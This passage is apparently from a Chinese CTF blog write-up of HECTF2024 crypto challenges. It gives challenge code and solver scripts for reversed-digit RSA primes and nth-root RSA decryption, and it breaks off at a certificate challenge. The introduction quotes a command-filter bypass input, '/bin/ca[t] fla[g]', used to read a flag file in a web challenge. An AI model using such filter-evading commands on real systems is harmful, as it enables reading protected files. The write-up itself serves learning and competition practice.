href="https://tangcuxiaojikuai.xyz/post/187210a7.html">糖醋小鸡块师傅收录曲线趣题</a></p><p>说起这个，也是有点内个了，我去师傅的博客搜<code>curve</code>的时候，点过了这篇，然后它刚好在第一题，我就没怎么注意，可能还是用的<code>Ctrl+f</code>，然后直接往下拉，结果就是完美错过了QWQ</p><p>后面看了出题人的<code>wp</code>，<code>羊城杯</code>，<code>灵感来源</code>，好好好</p><p>真是应了<code>Csome</code>那句话<br><strong>在这CINTA是基础，Sagemath是工具，糖醋小鸡块的blog是弹药库</strong></p><h1 id="HECTF2024"><a href="#HECTF2024" class="headerlink" title="HECTF2024"></a>HECTF2024</h1><p>这次也是没时间充当<code>web手</code>了，一边打密码，一边写作业，真折磨</p><p>说实话还是挺想打<code>web</code>的，看了一下反序列化那题，感觉构造链子应该不难，重点是绕过，但我感觉给防死了，结果是要拿正则表达式匹配绕过啊，<code>/bin/ca[t] fla[g]</code>(不是单纯的<code>cat</code>哦)</p><p>真就，<strong>过滤的越严格，过滤的越简单</strong></p><p>说起来，正好最近的网络空间安全的课程实验打的<code>iwebsec</code>的靶场有命令过滤绕过，我自己也想到了正则表达式匹配，但这里大脑死机了，可能是事情太多了</p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="迷茫的艾米莉"><a href="#迷茫的艾米莉" class="headerlink" title="迷茫的艾米莉"></a>迷茫的艾米莉</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在维吉尼亚小镇，园丁艾米莉的responsibility是照顾一座古老花园，每天修剪六段绿篱栅栏</span><br><span class="line">一天，她发现通往秘密花园的小径，入口却被封上了</span><br><span class="line">上面有一串密文</span><br><span class="line">Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c&#125;&#123;lr</span><br><span class="line">请输入密码帮助艾米莉探索秘密花园</span><br></pre></td></tr></table></figure><p>题目直接就告诉了你所有关键信息<br><img src="https://pic1.zhimg.com/80/v2-1ad756efbef37b149d62b73a955770b0_1440w.png" alt=""><br><img src="https://picx.zhimg.com/80/v2-58a35075719f46e3bd7efc1b9aa24de9_1440w.png" alt=""></p><h3 id="翻一翻"><a href="#翻一翻" class="headerlink" title="翻一翻"></a>翻一翻</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, isPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">emirp</span>(<span class="params">x</span>):</span><br><span class="line">    y = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> x !=<span class="number">0</span>:</span><br><span class="line">        y = y*<span class="number">10</span> + x%<span class="number">10</span></span><br><span class="line">        x = x//<span class="number">10</span></span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = emirp(p)</span><br><span class="line">    <span class="keyword">if</span> isPrime(q):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">flag = base64.b64encode(flag)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 404647938065363927581436797059920217726808592032894907516792959730610309231807721432452916075249512425255272010683662156287639951458857927130814934886426437345595825614662468173297926187946521587383884561536234303887166938763945988155320294755695229129209227291017751192918550531251138235455644646249817136993</span></span><br><span class="line"><span class="string">c = 365683379886722889532600303686680978443674067781851827634350197114193449886360409198931986483197030101273917834823409997256928872225094802167525677723275059148476025160768252077264285289388640035034637732158021710365512158554924957332812612377993122491979204310133332259340515767896224408367368108253503373778</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>q是p的十进制数字反转(<code>emirp数</code>)<br><a href="https://kt.gy/blog/2015/10/asis-2015-finals-rsasr/">原题</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">404647938065363927581436797059920217726808592032894907516792959730610309231807721432452916075249512425255272010683662156287639951458857927130814934886426437345595825614662468173297926187946521587383884561536234303887166938763945988155320294755695229129209227291017751192918550531251138235455644646249817136993</span></span><br><span class="line">c = <span class="number">365683379886722889532600303686680978443674067781851827634350197114193449886360409198931986483197030101273917834823409997256928872225094802167525677723275059148476025160768252077264285289388640035034637732158021710365512158554924957332812612377993122491979204310133332259340515767896224408367368108253503373778</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t</span>(<span class="params">a, b, k</span>):</span><br><span class="line">    <span class="comment"># sqrt(n) has 155 digits, so we need to figure out 77 digits on each side</span></span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">77</span>:</span><br><span class="line">        <span class="keyword">if</span> a*b == n:</span><br><span class="line">            <span class="built_in">print</span>(a, b)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="comment"># we try to guess the last not-already-guessed digits of both primes</span></span><br><span class="line">            a1 = a + i*(<span class="number">10</span>**k) + j*(<span class="number">10</span>**(<span class="number">154</span>-k))</span><br><span class="line">            b1 = b + j*(<span class="number">10</span>**k) + i*(<span class="number">10</span>**(<span class="number">154</span>-k))</span><br><span class="line">            <span class="keyword">if</span> a1*b1 &gt; n:</span><br><span class="line">                <span class="comment"># a1 and b1 are too large</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> (a1+(<span class="number">10</span>**(<span class="number">154</span>-k)))*(b1+(<span class="number">10</span>**(<span class="number">154</span>-k))) &lt; n:</span><br><span class="line">                <span class="comment"># a1 and b1 are too small</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ((a1*b1) % (<span class="number">10</span>**(k+<span class="number">1</span>))) != (n % (<span class="number">10</span>**(k+<span class="number">1</span>))):</span><br><span class="line">                <span class="comment"># The last digits of a1*b1 (which won&#x27;t change later) doesn&#x27;t match n</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">                <span class="comment"># this a1 and b1 seem to be a possible match, try to guess remaining digits</span></span><br><span class="line">            t(a1, b1, k+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># the primes have odd number of digits (155), so we try all possible middle digits (it simplifies the code)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    t(i*(<span class="number">10</span>**<span class="number">77</span>), i*(<span class="number">10</span>**<span class="number">77</span>), <span class="number">0</span>)</span><br><span class="line">p, q = <span class="number">39316409865082827891559777929907275271727781922450971403181273772573121561800306699150395758615464222134092274991810028405823897933152302724628919678029201</span>, <span class="number">10292087691982642720325133979832850482001819947229043122246451685759305199660300816512137527737218130417905422918772717257270992977795519872828056890461393</span></span><br><span class="line"><span class="built_in">print</span>(p*q == n)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n)).decode()</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag).decode())</span><br></pre></td></tr></table></figure><p>拓展：如果是二进制数的反转呢？<br><a href="https://lazzzaro.github.io/2020/12/06/match-RoarCTF-2020/index.html#Reverse">见La佬的这篇博客</a></p><h3 id="seven-more"><a href="#seven-more" class="headerlink" title="seven more"></a>seven more</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getMyPrime</span>(<span class="params">nbits, multiplier</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n = <span class="number">2</span> * multiplier * getPrime(nbits // <span class="number">2</span>) * getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> is_prime(n + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_keys</span>(<span class="params">nbits</span>):</span><br><span class="line">    p = getMyPrime(nbits, <span class="number">1009</span> * <span class="number">7</span>)</span><br><span class="line">    q = getMyPrime(nbits, <span class="number">1009</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">1009</span> * <span class="number">7</span></span><br><span class="line">    <span class="keyword">return</span> p, q, n, e</span><br><span class="line"></span><br><span class="line">p, q, n, e = generate_keys(<span class="number">700</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;HECTF&#123;######&#125;&#x27;</span> + os.urandom(<span class="number">101</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; n.bit_length()</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &gt; q.bit_length()</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &gt; p.bit_length()</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n = 211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201</span></span><br><span class="line"><span class="comment">#c = 191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066</span></span><br><span class="line"><span class="comment">#p = 31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223</span></span><br><span class="line"><span class="comment">#q = 6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687</span></span><br></pre></td></tr></table></figure><p>先感谢一波<code>T0ver.</code> 我滴神！</p><p>我们知道<code>e</code>与<code>phi</code>并不互素，可以考虑<code>AMM算法</code>，这里直接上<a href="https://tover.xyz/p/n-root-in-F/#2024-11-30%E6%9B%B4%E6%96%B0">师兄的科技</a></p><p>小改一下下</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.parallel.multiprocessing_sage <span class="keyword">import</span> parallel_iter    <span class="comment"># TODO</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nth_p</span>(<span class="params">y, n, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[LOG] Solving pi = %s^%d&#x27;</span> % (<span class="built_in">hex</span>(p), k))</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    xs = Zmod(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    xs = GF(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  xs = <span class="built_in">list</span>(<span class="built_in">set</span>(xs))</span><br><span class="line">  xs = [Integer(x) <span class="keyword">for</span> x <span class="keyword">in</span> xs]</span><br><span class="line">  <span class="keyword">return</span> xs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_p</span>(<span class="params">c, e, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  P = Integer(<span class="built_in">pow</span>(p, k))</span><br><span class="line">  phi = euler_phi(P)</span><br><span class="line"></span><br><span class="line">  rs = []</span><br><span class="line">  ei = e</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = gcd(phi, ei)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    rs += [r]</span><br><span class="line">    ei //= r</span><br><span class="line">  r = product(rs)</span><br><span class="line">  dr = (e // r).inverse_mod(phi)</span><br><span class="line">  cr = <span class="built_in">pow</span>(c, dr, P)</span><br><span class="line">  <span class="keyword">return</span> nth_p(cr, r, p, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_n</span>(<span class="params">c, e, ps, ks=<span class="literal">None</span>, checker=<span class="literal">None</span>, ret1=<span class="literal">False</span></span>):</span><br><span class="line">  <span class="comment"># ps: p, q, ...</span></span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(ps, <span class="built_in">list</span>)</span><br><span class="line">  <span class="keyword">if</span> ks == <span class="literal">None</span>:</span><br><span class="line">    ks = [<span class="number">1</span>] * <span class="built_in">len</span>(ps)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(ps) == <span class="built_in">len</span>(ks)</span><br><span class="line">  ms = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps)):</span><br><span class="line">    mp = nthRSA_p(c, e, ps[i], ks[i])</span><br><span class="line">    ms += [mp]</span><br><span class="line">  total = product([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[Log] Doing crt.\nComplexity = %d: %s&#x27;</span> % (total, <span class="built_in">str</span>([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])))</span><br><span class="line"></span><br><span class="line">  res = []</span><br><span class="line">  Ps = [ps[i]**ks[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps))]</span><br><span class="line">  <span class="keyword">for</span> msi <span class="keyword">in</span> tqdm(itertools.product(*ms), total=total):</span><br><span class="line">    m = crt(<span class="built_in">list</span>(msi), Ps)</span><br><span class="line">    <span class="keyword">if</span> checker == <span class="literal">None</span>:</span><br><span class="line">      res += [m]</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> checker(m):</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> ret1:</span><br><span class="line">        res += [m]</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">return</span> m</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genHeaderChecker</span>(<span class="params">hd</span>):</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">str</span>):</span><br><span class="line">    hd = hd.encode()</span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">bytes</span>)</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkHeader</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">      <span class="keyword">if</span> hd <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkHeader</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genStrChecker</span>(<span class="params"><span class="built_in">dict</span>, n=<span class="number">65537</span></span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkStr</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m)).decode()</span><br><span class="line">      <span class="keyword">for</span> fi <span class="keyword">in</span> flag[:n]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> fi <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">      <span class="built_in">print</span>(flag)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkStr</span><br><span class="line"></span><br><span class="line">n = <span class="number">211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201</span></span><br><span class="line">c = <span class="number">191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066</span></span><br><span class="line">p = <span class="number">31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223</span></span><br><span class="line">q = <span class="number">6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687</span></span><br><span class="line">e = <span class="number">1009</span>*<span class="number">7</span></span><br><span class="line">ps = [p, q]</span><br><span class="line">checker = genHeaderChecker(<span class="string">&#x27;HECTF&#x27;</span>)</span><br><span class="line">res = nthRSA_n(c, e, ps, checker=checker)</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">  flag = long_to_bytes(<span class="built_in">int</span>(r))</span><br><span class="line">  <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="不合格的魔药-unsolved"><a href="#不合格的魔药-unsolved" class="headerlink" title="不合格的魔药(unsolved)"></a>不合格的魔药(unsolved)</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> fastecdsa.curve <span class="keyword">import</span> Curve</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">A_function</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(<span class="number">512</span>)</span><br><span class="line">        q = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> q % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">            n = p * q</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    a = randrange(p)</span><br><span class="line">    b = randrange(q)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x1 = randrange(p)</span><br><span class="line">        y1 = (x1**<span class="number">3</span> + a*x1) % p</span><br><span class="line">        x2 = randrange(n)</span><br><span class="line">        y2 = (x2**<span class="number">3</span> + a*x2 + b) % n</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(y1,(p-<span class="number">1</span>)//<span class="number">2</span>, p) == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">pow</span>(y1,(q-<span class="number">1</span>)//<span class="number">2</span>, q) == <span class="number">1</span>:</span><br><span class="line">            yp = <span class="built_in">pow</span>(y1,p//<span class="number">4</span>+<span class="number">1</span>,p)</span><br><span class="line">            yq = <span class="built_in">pow</span>(y1,q//<span class="number">4</span>+<span class="number">1</span>,q)</span><br><span class="line">            _,s,t = gcdext(p,q)</span><br><span class="line">            y1 = (s*p*yq + t*q*yp) % p</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">pow</span>(y2,(p-<span class="number">1</span>)//<span class="number">2</span>, p) == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">pow</span>(y2,(q-<span class="number">1</span>)//<span class="number">2</span>, q) == <span class="number">1</span>:</span><br><span class="line">                yp = <span class="built_in">pow</span>(y2,p//<span class="number">4</span>+<span class="number">1</span>,p)</span><br><span class="line">                yq = <span class="built_in">pow</span>(y2,q//<span class="number">4</span>+<span class="number">1</span>,q)</span><br><span class="line">                _,s,t = gcdext(p,q)</span><br><span class="line">                y2 = (s*p*yq + t*q*yp) % n</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    Ep = Curve(<span class="literal">None</span>, p, a, <span class="number">0</span>, <span class="literal">None</span>, x1, y1) </span><br><span class="line">    En = Curve(<span class="literal">None</span>, n, a, b, <span class="literal">None</span>, x2, y2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;q =&quot;</span>, q)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;a =&quot;</span>, a)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;b =&quot;</span>, b)</span><br><span class="line">    hint1 = key * Ep.G</span><br><span class="line">    hint = [x1 ,hint1]</span><br><span class="line">    <span class="keyword">return</span> En, hint</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">A_encrypt</span>(<span class="params">m, G, k</span>):</span><br><span class="line">    blocks = [m[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m) // <span class="number">16</span>)]</span><br><span class="line">    ciph = []</span><br><span class="line">    aes = AES.new(k, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(blocks)):</span><br><span class="line">        c = aes.encrypt(blocks[i])</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">            G = G + G</span><br><span class="line">            ciph.append(G.x ^ bytes_to_long(c))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ciph.append(G.y ^ bytes_to_long(c))</span><br><span class="line">    <span class="keyword">return</span> ciph               </span><br><span class="line"></span><br><span class="line">flag = secret.flag</span><br><span class="line">key = secret.key</span><br><span class="line"></span><br><span class="line">m = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span> <span class="string">b&#x27;HECTF&#123;&#x27;</span>+ m+ <span class="string">b&#x27;&#125;&#x27;</span> == flag</span><br><span class="line">A, hint = A_function(key)</span><br><span class="line">k = md5(long_to_bytes(key)).hexdigest().encode()</span><br><span class="line">c = A_encrypt(m, A.G,k)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hint =&quot;</span>, hint)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 9604080254440553624043823039323876524034439909584709693304859297324410855942111467832096190746534800378359779991381701244554754870303658957438266614583487</span></span><br><span class="line"><span class="string">q = 7117529167860499983120234872664469946810713755399747931099511148595647881645694071900284496403308583631053530870961375928947111857317803005696543076720079</span></span><br><span class="line"><span class="string">a = 4681007517868949260473646867708411042804596292653498068045093108939357065240201843535644313612886376810286247810943227474659270191834401055704514648846995</span></span><br><span class="line"><span class="string">b = 5604862515726338933576748414825616582947323501967288114322080747741801017833194347273532400730033226601964489467416955741018175785792514035352083708135431</span></span><br><span class="line"><span class="string">hint = [5544706922427110224110125906620053049906095568886481576326706308027915868515721429471522223193053363494813044921519216114372968191072598748704528735817403, </span></span><br><span class="line"><span class="string">        X: 0x2fa8e23f18ed4a9bd752a0c22b0750c17fbb66c76554e2089258fd979a5736b7766c974fb9788acf17fb065dc1daec6a8a6e98021de6c4ce3cde11dd54590e1d</span></span><br><span class="line"><span class="string">        Y: 0xa3ce4bb1e25563b577a45cd06153d2dab584a70130c7ae71e65fe5e11b60493ccb845fbe4989dbd4a60d6a1ff12baa268b8833ed30f7c7e21c32268a139b5b6b</span></span><br><span class="line"><span class="string">        (On curve &lt;None&gt;)]</span></span><br><span class="line"><span class="string">c = [36780810764729391947601691590378765170863850291763672158886689602006275675399596108959250284869355070618680265311484525337488013177333417742808496794250706127014303883956401715343247310936978778751394980638177344654524711571648231122027699452582302505466999915200896495338587961829985149664712686944510559820, 20958199004445348755624931477686903609410629089817702686793041731031202915294487428236505796231417377524290926704880107242252471250791747709149963693453815320856114055076830778689575609444155241642860745570792018879816650383543271943138193405548674967958109800776284787612370057476837642989670234913968669332, 19758181515666300263334531148587391869707566215385658759724970483060039216682585723722462835458856503531814316860237786892749700501436669071048571605926728917066797641628644730857333648930286503355701843365288276242984029888215453858844295912023305616753086127934173496355853797241944921600781294012353332277, 45576628433681427718167093217006549620067042472164439269014690121698560736312716407875326404496263261341269644373184438703912129559084380247641072914940830606649124606611794031719696797961847217643536070335745057048220615012019629278484208808353027070994021979997462190775853832457224157083880895894000484461]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>还是曲线，没时间做了，看解出人数也是挺少的，而且还要做作业呢QWQ</p><h3 id="情书与破碎的证书-再留个坑？"><a href="#情书与破碎的证书-再留个坑？" class="headerlink" title="情书与破碎的证书(再留个坑？)"></a>情书与破碎的证书(再留个坑？)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小明喜欢上了小红，他使用rsa向小红发送了无数封含有中文字符的情书。终于小红忍不住了，找到了大嘿阔将小明的私钥证书打成碎片，移除了中间的内容并把上下段的私钥部分转化成16进制，以九个为一组用相同的方式打乱（转化时产生的0d0a换行符已被移除）。作为密码学大佬的你能恢复证书，找出小红忍无可忍的证据么？</span><br><span class="line">提示1</span><br><span class="line">情书与破碎的证书 hint1:字符中含有中文 常规输出方法无效，请使用 PKCS1_OAEP 解密器，并使用 cipher.decrypt() 解密密文（毕竟考点是证书）</span><br></pre></td></tr></table></figure><p>证书</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 